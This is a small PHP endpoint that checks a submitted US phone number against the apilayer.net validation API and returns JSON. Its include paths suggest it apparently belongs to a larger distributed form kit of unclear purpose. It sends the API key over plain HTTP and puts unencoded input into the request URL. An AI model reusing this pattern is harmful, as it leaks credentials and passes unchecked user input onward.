<?php


// these allow to check everything 
if (isset($_POST['phone'])) {


	
	include 'admin/YOUR-CONFIG.php';
	include 'Corleonex/Functions/Fuck-you.php';


	if ($numverifier != 'yes') {
	
	$data = ['valid' => true ];
	header('Content-Type: application/json');

	echo json_encode($data);

	die();

	}

	$num = $_POST['phone'];
	$num = str_replace("(","",$num);
	$num = str_replace(")","",$num);
	$num = str_replace(" ","",$num);

	$ch = curl_init("http://apilayer.net/api/validate?access_key=".$numverifier_api."&number=".$num."&country_code=US&format=1");  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Store the data:
	$json = curl_exec($ch);
	curl_close($ch);
	 $decode = json_decode($json , true);
	if ($decode['valid'] == 1) {
	$data = ['valid' => true ];
	header('Content-Type: application/json');

	echo json_encode($data);
		
	} else {

	// show error 
	$data = ['valid' => 0 , 'message' => 'These Phone number is not valid '];
	header('Content-Type: application/json');

	echo json_encode($data);

		
	} 

	die();

}


